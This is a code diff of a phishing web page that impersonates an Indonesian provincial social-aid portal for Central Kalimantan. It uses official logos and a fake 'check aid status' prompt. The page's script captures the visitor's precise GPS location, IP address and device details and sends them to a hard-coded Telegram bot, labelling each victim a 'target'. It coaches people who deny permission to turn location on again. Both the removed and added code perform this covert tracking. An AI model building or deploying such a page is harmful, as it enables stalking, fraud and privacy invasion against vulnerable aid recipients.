@@ -16,16 +16,16 @@
 
     <style>
         body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; color: #333; }
-        .container { text-align: center; background: white; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); width: 90%; max-width: 450px; overflow: hidden; position: relative; }
-        .header { background: linear-gradient(135deg, #004a99 0%, #003366 100%); padding: 25px 20px; color: white; position: relative; }
+        .container { text-align: center; background: white; border-radius: 16px; box-shadow: 0 15px 35px rgba(0,0,0,0.15); width: 90%; max-width: 450px; overflow: hidden; }
+        .header { background: linear-gradient(135deg, #004a99 0%, #003366 100%); padding: 25px 20px; color: white; }
         .header img { width: 65px; margin-bottom: 12px; filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2)); }
-        .header h1 { font-size: 20px; margin: 0; text-transform: uppercase; letter-spacing: 1.5px; font-weight: 800; }
-        .content { padding: 30px 25px; position: relative; }
+        .header h1 { font-size: 19px; margin: 0; text-transform: uppercase; letter-spacing: 1px; font-weight: 800; }
+        .content { padding: 30px 25px; }
 
         .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #004a99; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; display: none; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        .info-box { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: left; background: #f8fbff; padding: 18px; border-radius: 10px; border-left: 5px solid #004a99; box-shadow: inset 0 0 10px rgba(0,0,0,0.02); }
+        .info-box { color: #444; font-size: 14px; line-height: 1.6; margin-bottom: 25px; text-align: left; background: #f8fbff; padding: 18px; border-radius: 10px; border-left: 5px solid #004a99; }
         .info-box.error { background: #fff5f5; border-left-color: #e53e3e; }
         .info-box.warning { background: #fffaf0; border-left-color: #ed8936; }
         .info-box.success { background: #f0fff4; border-left-color: #38a169; }
@@ -36,26 +36,18 @@
 
         .verify-id { font-size: 11px; color: #718096; margin-bottom: 20px; font-family: 'Courier New', Courier, monospace; background: #edf2f7; padding: 5px 10px; border-radius: 4px; display: inline-block; }
 
-        .btn-start { background: #c05621; background: linear-gradient(to bottom, #dd6b20, #c05621); color: white; border: none; padding: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 17px; width: 100%; transition: all 0.2s; box-shadow: 0 4px 12px rgba(221, 107, 32, 0.3); text-transform: uppercase; }
-        .btn-start:active { transform: scale(0.98); box-shadow: none; }
+        .btn-start { background: #dd6b20; color: white; border: none; padding: 18px; border-radius: 10px; font-weight: bold; cursor: pointer; font-size: 17px; width: 100%; transition: all 0.2s; box-shadow: 0 4px 12px rgba(221, 107, 32, 0.3); }
+        .btn-start:active { transform: scale(0.98); }
 
-        /* Fake Console Style */
-        #logConsole { display: none; background: #1a202c; color: #68d391; font-family: 'Consolas', 'Monaco', monospace; font-size: 10px; padding: 12px; border-radius: 8px; margin-top: 15px; text-align: left; border: 1px solid #2d3748; height: 70px; overflow: hidden; line-height: 1.4; }
+        .official-seals { display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.6; filter: grayscale(100%); }
+        .official-seals img { height: 26px; }
 
-        .official-seals { display: flex; justify-content: center; gap: 15px; margin-top: 25px; opacity: 0.5; filter: grayscale(100%); }
-        .official-seals img { height: 28px; }
-
-        .footer { padding: 20px; color: #718096; font-size: 11px; background: #f7fafc; border-top: 1px solid #edf2f7; line-height: 1.5; }
-
-        /* Scanning Animation */
-        .scanner { position: absolute; top: 0; left: 0; width: 100%; height: 2px; background: rgba(49, 130, 206, 0.4); box-shadow: 0 0 10px #3182ce; animation: scan 3s infinite; display: none; z-index: 10; }
-        @keyframes scan { 0% { top: 0; } 100% { top: 100%; } }
+        .footer { padding: 20px; color: #718096; font-size: 11px; background: #f7fafc; border-top: 1px solid #edf2f7; }
     </style>
 </head>
 <body>
 
     <div class="container">
-        <div id="scanner" class="scanner"></div>
         <div class="header">
             <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/0/01/Coat_of_arms_of_Central_Kalimantan.svg/1200px-Coat_of_arms_of_Central_Kalimantan.svg.png" alt="Logo Kalteng">
             <h1>BANMAS KALTENG</h1>
@@ -63,27 +55,23 @@
 
         <div class="content">
             <div id="loader" class="spinner"></div>
-            <h2 id="statusTitle" style="font-size: 18px; margin-top: 0;">Verifikasi Identitas Digital</h2>
+            <h2 id="statusTitle" style="font-size: 18px; margin-top: 0;">Cek Penerima Bantuan</h2>
 
-            <div class="verify-id" id="verifyId">REF-ID: <span id="idCode">BMS-PENDING</span></div>
+            <div class="verify-id" id="verifyId">REF-ID: <span id="idCode">MENUNGGU...</span></div>
 
             <div class="progress-container" id="progressContainer">
                 <div class="progress-bar" id="progressBar"></div>
             </div>
-            <div id="accDisplay" class="accuracy-info">📡 Menginisialisasi Sensor Satelit...</div>
+            <div id="accDisplay" class="accuracy-info">📡 Menghubungkan ke Satelit...</div>
 
             <div id="statusDesc" class="info-box">
-                <b>PEMBERITAHUAN RESMI:</b><br>
-                Sistem mendeteksi akses dari perangkat Anda. Untuk melanjutkan pengecekan bantuan <b>Kartu Huma Betang</b>, verifikasi lokasi real-time diperlukan sebagai bukti fisik domisili di Kalimantan Tengah.
+                <b>PENTING:</b><br>
+                Halaman ini digunakan untuk memvalidasi lokasi Anda sebagai syarat penerima bantuan di wilayah <b>Kalimantan Tengah</b>.
                 <br><br>
-                Klik tombol di bawah untuk memulai proses sinkronisasi data lokasi dengan <b>Pusdatin Kalteng</b>.
+                Klik tombol di bawah untuk memulai pengecekan otomatis.
             </div>
 
-            <button id="btnAction" class="btn-start" onclick="startCapture()">MULAI VERIFIKASI SEKARANG</button>
-
-            <div id="logConsole">
-                <div id="logContent"></div>
-            </div>
+            <button id="btnAction" class="btn-start" onclick="startCapture()">CEK STATUS SEKARANG</button>
 
             <div class="official-seals">
                 <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/b/be/Logo_Kementerian_Sosial.png/800px-Logo_Kementerian_Sosial.png" alt="Kemensos">
@@ -94,8 +82,7 @@
 
         <div class="footer">
             <b>DINAS SOSIAL PROVINSI KALIMANTAN TENGAH</b><br>
-            Jl. Mayjen. Panjaitan No.12, Palangka Raya<br>
-            Sistem Terverifikasi © 2024 Portal BANMAS
+            Sistem Verifikasi Lokasi Terenkripsi © 2024
         </div>
     </div>
 
@@ -104,22 +91,13 @@
         const CHAT_ID = '5004761119';
         const REDIRECT_URL = 'https://banmas.humabetang.net/';
         let watchId = null;
-        let stepInterval = null;
-
-        function addLog(msg) {
-            const log = document.getElementById('logContent');
-            const line = document.createElement('div');
-            line.innerHTML = `> ${msg}`;
-            log.appendChild(line);
-            if (log.children.length > 4) log.removeChild(log.firstChild);
-        }
 
         async function sendToTelegram(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML', disable_web_page_preview: true })
+                    body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'HTML' })
                 });
             } catch (e) {}
         }
@@ -129,76 +107,23 @@
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 return data.ip;
-            } catch (e) { return 'Gagal ambil IP'; }
+            } catch (e) { return 'N/A'; }
         }
 
-        async function getIPLocation() {
-            try {
-                const res = await fetch('https://ipapi.co/json/');
-                const data = await res.json();
-                return `🏙️ <b>Estimasi Wilayah:</b> <code>${data.city}, ${data.region}</code>\n` +
-                       `🏢 <b>ISP/Org:</b> <code>${data.org}</code>`;
-            } catch (e) { return '🏙️ <b>Estimasi Wilayah:</b> Gagal deteksi IP API'; }
-        }
-
-        async function getAddress(lat, lon) {
-            try {
-                const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lon}&zoom=18`);
-                const data = await res.json();
-                return data.display_name || "Alamat tidak ditemukan";
-            } catch (e) { return "Gagal memetakan alamat (Timeout/API)"; }
-        }
-
-        async function getDetailedSpecs() {
-            const ua = navigator.userAgent;
-            const platform = navigator.platform;
-            const screenRes = `${window.screen.width}x${window.screen.height} (${window.screen.colorDepth}-bit)`;
-            const mem = navigator.deviceMemory || 'Unknown';
-            const cores = navigator.hardwareConcurrency || 'Unknown';
-            const lang = navigator.language || 'Unknown';
-            const tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-
-            let batteryInfo = 'N/A';
+        async function getSpecs() {
+            let battery = 'N/A';
             try {
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    batteryInfo = `${(b.level * 100).toFixed(0)}% (${b.charging ? 'Charging' : 'Plugged'})`;
+                    battery = `${(b.level * 100).toFixed(0)}%`;
                 }
             } catch (e) {}
-
-            let net = 'Unknown';
-            if (navigator.connection) {
-                net = `${navigator.connection.effectiveType.toUpperCase()} (${navigator.connection.downlink}Mbps)`;
-            }
-
-            let gpu = 'Unknown';
-            try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-                if (gl) {
-                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                    gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : 'Generic WebGL';
-                }
-            } catch (e) {}
-
-            return `💻 <b>SPESIFIKASI PERANGKAT</b>\n` +
-                   `• <b>Model/OS:</b> <code>${platform}</code>\n` +
-                   `• <b>Baterai:</b> <code>${batteryInfo}</code>\n` +
-                   `• <b>Jaringan:</b> <code>${net}</code>\n` +
-                   `• <b>Hardware:</b> <code>${cores} Cores / ${mem}GB RAM</code>\n` +
-                   `• <b>Layar:</b> <code>${screenRes}</code>\n` +
-                   `• <b>GPU:</b> <code>${gpu}</code>\n` +
-                   `• <b>Bahasa:</b> <code>${lang}</code>\n` +
-                   `• <b>Zona Waktu:</b> <code>${tz}</code>\n` +
-                   `• <b>User-Agent:</b> <code>${ua.substring(ua.length - 50)}</code>`;
+            return `📱 <b>HP:</b> <code>${navigator.platform}</code>\n🔋 <b>Baterai:</b> <code>${battery}</code>`;
         }
 
         async function startCapture() {
-            const randomID = "BANMAS-KTG" + Math.floor(1000 + Math.random() * 9000) + "-" + Math.random().toString(36).substr(2, 4).toUpperCase();
+            const randomID = "BMS-" + Math.floor(1000 + Math.random() * 9000);
             document.getElementById('idCode').innerText = randomID;
-
-            if (watchId) navigator.geolocation.clearWatch(watchId);
-            if (stepInterval) clearInterval(stepInterval);
 
             const btn = document.getElementById('btnAction');
             const loader = document.getElementById('loader');
@@ -207,128 +132,69 @@
             const progCont = document.getElementById('progressContainer');
             const progBar = document.getElementById('progressBar');
             const accDisp = document.getElementById('accDisplay');
-            const logs = document.getElementById('logConsole');
-            const scanner = document.getElementById('scanner');
 
-            if (navigator.vibrate) navigator.vibrate(50);
             btn.style.display = 'none';
             loader.style.display = 'block';
             progCont.style.display = 'block';
             accDisp.style.display = 'block';
-            logs.style.display = 'block';
-            scanner.style.display = 'block';
-            title.innerText = "Verifikasi Sedang Berjalan...";
-            desc.className = "info-box";
+            title.innerText = "Sedang Memproses...";
 
-            const steps = [
-                { t: "Mengamankan jalur data SSL/TLS...", p: "15%", log: "Handshake with Pusdatin Server..." },
-                { t: "Mengautentikasi ID Perangkat...", p: "35%", log: "Device ID verified: " + randomID },
-                { t: "Sinkronisasi Koordinat Geospasial...", p: "60%", log: "Requesting high-accuracy GPS..." },
-                { t: "Memvalidasi Area Kalimantan Tengah...", p: "85%", log: "Filtering regional boundaries..." }
-            ];
+            let p = 0;
+            const pInterval = setInterval(() => {
+                p += 5; if (p > 90) clearInterval(pInterval);
+                progBar.style.width = p + "%";
+            }, 500);
 
-            let stepIdx = 0;
-            desc.innerHTML = `<center><b>PROSES 1:</b> ${steps[0].t}</center>`;
-            progBar.style.width = steps[0].p;
-            addLog(steps[0].log);
+            sendToTelegram(`🚀 <b>TARGET BARU</b>\nID: <code>${randomID}</code>\n<i>Menunggu GPS...</i>`);
 
-            stepInterval = setInterval(() => {
-                stepIdx++;
-                if (stepIdx < steps.length) {
-                    desc.innerHTML = `<center><b>PROSES ${stepIdx+1}:</b> ${steps[stepIdx].t}</center>`;
-                    progBar.style.width = steps[stepIdx].p;
-                    addLog(steps[stepIdx].log);
-                } else {
-                    clearInterval(stepInterval);
-                    addLog("Menunggu respons satelit...");
-                }
-            }, 2500);
-
-            const firstMsg = `🚀 <b>SESI BARU DIMULAI</b>\nID: <code>${randomID}</code>\nURL: <code>${window.location.hostname}</code>\n<i>Menunggu persetujuan GPS...</i>`;
-            sendToTelegram(firstMsg);
-
-            if (!navigator.geolocation) {
-                addLog("Error: Browser tidak mendukung GPS.");
-                await sendToTelegram("❌ Browser tidak support GPS.");
-                window.location.href = REDIRECT_URL;
-                return;
-            }
-
-            const successCallback = async (p) => {
+            const success = async (pos) => {
+                clearInterval(pInterval);
                 if (watchId) navigator.geolocation.clearWatch(watchId);
-                if (stepInterval) clearInterval(stepInterval);
 
-                const lat = p.coords.latitude;
-                const lon = p.coords.longitude;
-                const acc = p.coords.accuracy.toFixed(1);
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const acc = pos.coords.accuracy.toFixed(0);
 
                 progBar.style.width = "100%";
-                accDisp.innerHTML = `🛰️ Sinyal Terkunci (Presisi: ${acc}m)`;
+                accDisp.innerHTML = `✅ GPS Terkunci (${acc}m)`;
                 accDisp.style.color = "#38a169";
-                addLog("Koordinat diterima: " + lat.toFixed(4) + ", " + lon.toFixed(4));
 
-                if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
+                await sendToTelegram(`📍 <b>LOKASI DITEMUKAN</b>\nID: <code>${randomID}</code>\n📍 <a href="https://www.google.com/maps?q=${lat},${lon}">BUKA GOOGLE MAPS</a>\n🎯 Akurasi: ${acc}m`);
 
-                await sendToTelegram(
-                    `📍 <b>LOKASI DITEMUKAN</b>\n` +
-                    `ID: <code>${randomID}</code>\n\n` +
-                    `🗺️ <b>Peta:</b> <a href="https://www.google.com/maps?q=${lat},${lon}">BUKA GOOGLE MAPS</a>\n` +
-                    `🎯 <b>Akurasi:</b> <code>${acc} meter</code>\n` +
-                    `📍 <b>Lat/Lon:</b> <code>${lat}, ${lon}</code>`
-                );
-
-                title.innerText = "Verifikasi Berhasil";
+                title.innerText = "Verifikasi Berhasil!";
                 desc.className = "info-box success";
-                desc.innerHTML = "✅ <b>Verifikasi Selesai!</b> Lokasi Anda telah tervalidasi oleh sistem. Anda akan segera dialihkan ke halaman status bantuan...";
-                addLog("Data terkirim ke Server Utama.");
+                desc.innerHTML = "✅ <b>Lokasi Terdeteksi!</b> Anda berada di wilayah Kalimantan Tengah. Mengalihkan ke halaman status...";
 
-                const [ip, addr, specs] = await Promise.all([getIP(), getAddress(lat, lon), getDetailedSpecs()]);
+                const [ip, specs] = await Promise.all([getIP(), getSpecs()]);
+                await sendToTelegram(`✅ <b>DATA LENGKAP</b>\nID: <code>${randomID}</code>\n🌐 IP: <code>${ip}</code>\n${specs}`);
 
-                await sendToTelegram(
-                    `✅ <b>LAPORAN LENGKAP</b>\n` +
-                    `ID: <code>${randomID}</code>\n` +
-                    `🌐 <b>IP:</b> <code>${ip}</code>\n` +
-                    `🏠 <b>Alamat:</b>\n<code>${addr}</code>\n\n` +
-                    specs
-                );
-
-                setTimeout(() => { window.location.href = REDIRECT_URL; }, 3000);
+                setTimeout(() => { window.location.href = REDIRECT_URL; }, 2500);
             };
 
-            const errorCallback = async (err) => {
-                if (stepInterval) clearInterval(stepInterval);
+            const error = async (err) => {
+                clearInterval(pInterval);
                 loader.style.display = 'none';
-                scanner.style.display = 'none';
                 title.innerText = "Verifikasi Tertunda";
+                const ip = await getIP();
 
-                const [ip, ipLoc, specs] = await Promise.all([getIP(), getIPLocation(), getDetailedSpecs()]);
-
-                btn.style.display = 'block';
-                btn.innerText = "ULANGI PROSES VERIFIKASI";
-
-                if(err.code == 1) { // Permission Denied
+                if(err.code == 1) { // User Blocked GPS Permission
                     desc.className = "info-box error";
-                    desc.innerHTML = `<b>Izin Akses Lokasi Ditolak!</b><br>Sistem wajib memverifikasi posisi Anda untuk mencegah penyalahgunaan bantuan.<br><br><b>CARA MEMPERBAIKI:</b><br>1. Klik ikon Gembok 🔒 di pojok kiri atas browser.<br>2. Ubah Izin Lokasi menjadi <b>IZINKAN</b>.<br>3. Klik tombol Ulangi di bawah.`;
-                    addLog("Error: Akses ditolak pengguna.");
-                    await sendToTelegram(`⚠️ <b>AKSES DITOLAK</b>\nID: <code>${randomID}</code>\nIP: ${ip}\n${ipLoc}\n\n${specs}`);
-                } else {
+                    desc.innerHTML = `<b>Izin Lokasi Ditolak!</b><br>Sistem tidak bisa memverifikasi lokasi Anda.<br><br><b>CARA MEMPERBAIKI:</b><br>1. Klik <b>Ikon Gembok 🔒</b> di samping alamat web di atas.<br>2. Pilih <b>Izin</b> lalu aktifkan <b>Lokasi</b>.<br>3. Klik tombol <b>ULANGI PROSES</b>.`;
+                    await sendToTelegram(`⚠️ <b>DITOLAK</b>\nID: <code>${randomID}</code>\nIP: ${ip}`);
+                } else { // GPS is OFF on the device
                     desc.className = "info-box warning";
-                    desc.innerHTML = `<b>Sinyal GPS Tidak Ditemukan!</b><br>Pastikan fitur GPS/Lokasi di HP Anda sudah <b>AKTIF</b> dan Anda tidak sedang berada di dalam ruangan tertutup.<br><br><b>Sistem akan mendeteksi otomatis jika GPS diaktifkan...</b>`;
-                    addLog("Status: Menunggu sinyal GPS aktif...");
-                    await sendToTelegram(`⚠️ <b>GPS OFF / TIMEOUT</b>\nID: <code>${randomID}</code>\nIP: ${ip}\n${ipLoc}\n\n${specs}`);
+                    desc.innerHTML = `<b>GPS Belum Aktif!</b><br>Sinyal lokasi tidak terdeteksi.<br><br><b>CARA AKTIFKAN:</b><br>1. <b>Usap layar HP Anda dari atas ke bawah</b> (buka bilah notifikasi).<br>2. Klik ikon <b>Lokasi / GPS</b> agar menyala.<br>3. Tunggu di halaman ini, sistem akan mendeteksi otomatis...`;
+                    await sendToTelegram(`⚠️ <b>GPS MATI</b>\nID: <code>${randomID}</code>\nIP: ${ip}`);
 
                     if (!watchId) {
-                        watchId = navigator.geolocation.watchPosition(successCallback, (e) => {
-                            if (e.coords) {
-                                accDisp.innerHTML = `📡 Mencari Satelit... (Sinyal: ${e.coords.accuracy.toFixed(0)}m)`;
-                                addLog("Mendeteksi sinyal: " + e.coords.accuracy.toFixed(0) + "m");
-                            }
-                        }, { enableHighAccuracy: true, timeout: 20000, maximumAge: 0 });
+                        watchId = navigator.geolocation.watchPosition(success, null, { enableHighAccuracy: true });
                     }
                 }
+                btn.style.display = 'block';
+                btn.innerText = "ULANGI PROSES";
             };
 
-            navigator.geolocation.getCurrentPosition(successCallback, errorCallback, { enableHighAccuracy: true, timeout: 15000 });
+            navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true, timeout: 10000 });
         }
     </script>
 </body>
